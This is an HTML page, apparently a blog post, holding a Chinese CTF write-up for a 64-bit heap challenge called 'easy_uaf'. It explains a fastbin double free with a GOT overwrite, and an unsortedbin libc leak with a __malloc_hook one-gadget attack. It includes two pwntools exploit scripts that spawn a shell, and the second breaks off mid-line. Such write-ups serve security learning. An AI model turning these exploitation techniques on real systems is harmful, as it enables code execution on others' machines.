@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ScUpax0s" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="这次周赛真的学到许多，其中64位ret2dl还应当再研究一下（没做出来），这道经典的堆题整理一下思路 0x0 考察内容 fastbin attack UAF double free got 表劫持 unsortedbin切割 realloc调整栈空间构造ogg条件0x1 题目概览 经典64位菜单堆没去符号表没开PIE，出题大师傅：“不开PIE的堆就是裸题”，之前还没体会到这句话，这道题确实体会了一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TaLpwn fastbin+duoblefree">
+<meta property="og:url" content="http://yoursite.com/2020/06/08/TaLpwn_UAF/index.html">
+<meta property="og:site_name" content="ScUpax0s">
+<meta property="og:description" content="这次周赛真的学到许多，其中64位ret2dl还应当再研究一下（没做出来），这道经典的堆题整理一下思路 0x0 考察内容 fastbin attack UAF double free got 表劫持 unsortedbin切割 realloc调整栈空间构造ogg条件0x1 题目概览 经典64位菜单堆没去符号表没开PIE，出题大师傅：“不开PIE的堆就是裸题”，之前还没体会到这句话，这道题确实体会了一">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/08/thdoon.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/08/thdXyF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/08/th0uB4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/08/th0o80.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/08/thDhpq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/08/thWO4U.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/08/th5ev4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/09/thTsG6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/09/thHjCq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/09/thburD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/09/thbsGq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/09/t4bC0e.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/09/t4HOYR.png">
+<meta property="article:published_time" content="2020-06-08T14:28:27.000Z">
+<meta property="article:modified_time" content="2020-06-09T05:16:08.782Z">
+<meta property="article:author" content="Paxos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/06/08/thdoon.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/06/08/TaLpwn_UAF/"/>
+
+
+
+
+
+  <title>TaLpwn fastbin+duoblefree | ScUpax0s</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ScUpax0s</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/08/TaLpwn_UAF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Paxos">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/48941180?s=460&u=c99ae53e7dd15c30c6283cc36edb2f8825ce8aec&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ScUpax0s">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TaLpwn fastbin+duoblefree</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-08T22:28:27+08:00">
+                2020-06-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/TaL%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%91%A8%E8%B5%9B/" itemprop="url" rel="index">
+                    <span itemprop="name">TaL第一次周赛</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><del>这次周赛真的学到许多，其中64位ret2dl还应当再研究一下（没做出来），这道经典的堆题整理一下思路</del></p>
+<h1 id="0x0-考察内容"><a href="#0x0-考察内容" class="headerlink" title="0x0 考察内容"></a>0x0 考察内容</h1><ul>
+<li>fastbin attack</li>
+<li>UAF</li>
+<li>double free</li>
+<li>got 表劫持</li>
+<li>unsortedbin切割</li>
+<li>realloc调整栈空间构造ogg条件<h1 id="0x1-题目概览"><a href="#0x1-题目概览" class="headerlink" title="0x1 题目概览"></a>0x1 题目概览</h1></li>
+<li>经典64位菜单堆没去符号表没开PIE，出题大师傅：“不开PIE的堆就是裸题”，之前还没体会到这句话，这道题确实体会了一下qwq</li>
+<li>先看看关键的add函数。总结：size可控、buf可控。<img src="https://s1.ax1x.com/2020/06/08/thdoon.png" alt=""></li>
+<li>del函数free后不置空，存在UAF，free的同时将chunk表中存储相应笔记的那一行记录的size置0<img src="https://s1.ax1x.com/2020/06/08/thdXyF.png" alt=""></li>
+<li>edit函数在编辑之前检查了三个东西：1.idx的合法性。2.chunks表中存储的相应的buf指针是否为空。3.chunks表中存储的相应的buf的size是否为0。所以我们无法编辑已经被del后的buf<img src="https://s1.ax1x.com/2020/06/08/th0uB4.png" alt=""></li>
+<li>show函数，只检查idx合法性以及chunks中对应的buf的指针是否存在（其实是恒存在的，del的时候只将buf的size设置为0，没有清空buf的指针）<img src="https://s1.ax1x.com/2020/06/08/th0o80.png" alt=""></li>
+<li>全局变量chunks的结构，存储的是每一条buf的地址以及size。<img src="https://s1.ax1x.com/2020/06/08/thDhpq.png" alt=""></li>
+</ul>
+<h1 id="攻击思路一"><a href="#攻击思路一" class="headerlink" title="攻击思路一"></a>攻击思路一</h1><ul>
+<li>第一个思路是通过在fastbin中double free然后修改全局的chunks表中某一未free的buf的地址(如果有不清楚fastbin中doublefree的请看<a href="https://zhuanlan.zhihu.com/p/64434547" target="_blank" rel="noopener">fastbin中的doublefree</a>)，让这个地址指向got表中free函数对应的地址，然后edit编辑这个buf，等价于修改了got表中free函数的地址，我们将free函数的地址改为system函数的地址，然后将shellcode写在某一未free的buf的chunk上，然后free这个buf，此时相当于调用了system(“bin/sh/“)<img src="https://s1.ax1x.com/2020/06/08/thWO4U.png" alt=""></li>
+</ul>
+<h2 id="0x1-整体过程"><a href="#0x1-整体过程" class="headerlink" title="0x1 整体过程"></a>0x1 整体过程</h2><ul>
+<li>首先add三个块，大小分别是0x30、0x20、0x20、申请完chunks是这么个情况<img src="https://s1.ax1x.com/2020/06/08/th5ev4.png" alt=""></li>
+<li>然后对idx为1和2 的块double free。就是那两个大小是0x20和0x20的。<img src="https://s1.ax1x.com/2020/06/09/thTsG6.png" alt=""></li>
+<li>doublefree结束后，add一次，此时对fastbin中第一个chunk进行了一次写入，我们将fd的位置替换为fake chunk位置，此时我们将fd指向chunks的起始地址，也就是0x6020c0，这里刚好是我们申请的0x30那个块在chunks中存储信息的相应位置，为什么指向这里呢，<strong>因为这里的0x30恰好满足fastbin的size检查！这也是我们一开始错位构造的一个原因；并且，我们将0x30的记录放在chunks的最上面也意味着我们可以对他下面的所有的其他记录进行修改，这个修改的空间是比较大的，这是第二个原因。</strong></li>
+<li>然后我们add一次写上fake_fd指针指向chunks、再add两次。<img src="https://s1.ax1x.com/2020/06/09/thHjCq.png" alt="">可以看到此时，fastbin的第一项已经成功指向了chunks。</li>
+<li>接下来我们通过这个来做任意地址写，替换掉free在got中的真实地址。我们add，同时发送payload为free函数对应got表项的地址。<img src="https://s1.ax1x.com/2020/06/09/thburD.png" alt=""></li>
+<li>在edit一次，编辑这个假记录，等价于编辑free@got中free的真实地址，我们改为system。（当然要泄漏一下真实地址算一下libc base）<img src="https://s1.ax1x.com/2020/06/09/thbsGq.png" alt=""></li>
+<li>最后把shellcode写在堆上，然后free掉这个块，等价于调用了system(“/bin/sh”)</li>
+</ul>
+<h2 id="0x2-Exp"><a href="#0x2-Exp" class="headerlink" title="0x2 Exp"></a>0x2 Exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./easy_uaf"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(io,size,buf)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"size: "</span>)    </span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">"buf: "</span>)</span><br><span class="line">    io.sendline(str(buf))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(io,idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(io,idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(io,idx,buf)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">"buf: "</span>)</span><br><span class="line">    io.sendline(str(buf))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./easy_uaf"</span>)</span><br><span class="line"></span><br><span class="line">chunk = <span class="number">0x6020c0</span>    <span class="comment"># 储存每个块的指针+大小</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">chunk_32 = <span class="number">0x6020e0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size = <span class="number">0x20</span></span><br><span class="line">add(io,<span class="number">0x30</span>,<span class="string">"b"</span>*<span class="number">0x10</span>)   <span class="comment">#id:0</span></span><br><span class="line">add(io,size,<span class="string">"a"</span>*<span class="number">0x10</span>)   <span class="comment">#id:1</span></span><br><span class="line">add(io,size,<span class="string">"b"</span>*<span class="number">0x10</span>)   <span class="comment">#id:2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delt(io,<span class="number">1</span>)</span><br><span class="line">delt(io,<span class="number">2</span>)</span><br><span class="line">delt(io,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = flat(p64(chunk))       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(io,size,p1)     <span class="comment"># 做假fd</span></span><br><span class="line"></span><br><span class="line">add(io,size,<span class="string">"c"</span>*<span class="number">0x10</span>)</span><br><span class="line">add(io,size,<span class="string">"d"</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># 此时fatbin指向假fd的位置</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p3 = flat(p64(free_got),p64(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_got :"</span>,hex(free_got)</span><br><span class="line"></span><br><span class="line">add(io,size,p3) <span class="comment"># 改掉chunk的索引为free got</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(io,<span class="number">1</span>)      <span class="comment"># 利用freegot泄漏free的真实地址计算libc base</span></span><br><span class="line">free_now = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_now:"</span>,hex(free_now)</span><br><span class="line">offset = free_now-libc.sym[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"offset:"</span>,hex(offset)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"system :"</span>,hex(libc.sym[<span class="string">'system'</span>]+offset)</span><br><span class="line">sys = libc.sym[<span class="string">'system'</span>]+offset</span><br><span class="line"></span><br><span class="line">p4 = flat(p64(sys))</span><br><span class="line">edit(io,<span class="number">1</span>,p4)           <span class="comment"># 改free为system</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p5 = flat(<span class="string">"/bin/sh"</span>.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>))</span><br><span class="line">edit(io,<span class="number">3</span>,p5)           <span class="comment"># shellcode  写入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delt(io,<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="攻击思路二"><a href="#攻击思路二" class="headerlink" title="攻击思路二"></a>攻击思路二</h1><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/103789081" target="_blank" rel="noopener">一道类似思路的题</a></p>
+<h2 id="0x1-整体过程-1"><a href="#0x1-整体过程-1" class="headerlink" title="0x1 整体过程"></a>0x1 整体过程</h2><ul>
+<li>通过申请一个0x80的放入unsortbin和一个0x10的放入fastbin；然后再申请0x60，此时造成unsortedbin中的chunk被切割，返回的还是之前的chunk，UAF了（只不过此时的size变成0x60）</li>
+<li>然后show（）拿到main_arena地址进而获取malloc hook的地址，继而获取libc_base。</li>
+<li>再删掉这个0x60的块（del时不检查这个块是否被删过了），把它放到fastbin</li>
+<li>此时再直接编辑这个在fastbin中的块，直接改他的fd指针到malloc_hook-0x23。</li>
+<li>然后再把它申请回来，此时fastbin指向fakechunk（malloc_hook-0x23）</li>
+<li>然后调用add写这个fakechunk，改realloc hook为ogg，同时改malloc hook为realloc+偏移来调整栈空间确保满足ogg的条件<img src="https://s1.ax1x.com/2020/06/09/t4bC0e.jpg" alt="">当栈空间调整结束后[rsp+30]==0 成立<img src="https://s1.ax1x.com/2020/06/09/t4HOYR.png" alt=""></li>
+<li>最后一次add，pwn。<h2 id="0x2-EXP"><a href="#0x2-EXP" class="headerlink" title="0x2 EXP"></a>0x2 EXP</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./easy_uaf"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(io,size,buf)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"size: "</span>)    </span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">"buf: "</span>)</span><br><span class="line">    io.sendline(str(buf))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(io,idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(io,idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(io,idx,buf)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">"buf: "</span>)</span><br><span class="line">    io.sendline(str(buf))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(io)</span>:</span></span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./easy_uaf"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================</span></span><br><span class="line"></span><br><span class="line">chunk = <span class="number">0x6020c0</span>    <span class="comment"># 储存每个块的指针+大小</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(io,<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)   <span class="comment">#先开0x80</span></span><br><span class="line">add(io,<span class="number">0x10</span>,<span class="string">'b'</span>*<span class="number">0x09</span>)   <span class="comment">#再开0x10</span></span><br><span class="line"></span><br><span class="line">delt(io,<span class="number">0</span>)              <span class="comment"># 删掉0x80</span></span><br><span class="line"></span><br><span class="line">add(io,<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">7</span>)      <span class="comment"># 再开0x60此时返回的是之前删掉的0x80的块，UAF（切割）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(io,<span class="number">0</span>)     <span class="comment"># show不检查size，所以打出来main_arena+88</span></span><br><span class="line">io.recv(<span class="number">8</span>)      <span class="comment"># 过滤8个字节</span></span><br><span class="line">main_arena_88 = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"main_arena_88: "</span>,hex(int(main_arena_88)<span class="number">-0x80</span>)</span><br><span class="line">malloc_hook = main_arena_88 - <span class="number">0x80</span> - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc_hook: "</span>,hex(malloc_hook)</span><br><span class="line">offset = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc base: "</span>,hex(offset)</span><br><span class="line"></span><br><span class="line">delt(io,<span class="number">0</span>)      <span class="comment"># 重新再free idx：0 此时在fastbin里，注意，此时不delet 2 而是 delet 0，两个指向的是一样的，但是如果delet 2 会造成size清空导致无法edit</span></span><br><span class="line"></span><br><span class="line">p1 = flat(p64(malloc_hook<span class="number">-0x23</span>))    </span><br><span class="line">edit(io,<span class="number">2</span>,p1)   <span class="comment"># 编辑idx：2，此时这个块已经在fastbin里了，相当于直接改了fd指针。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(io)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span 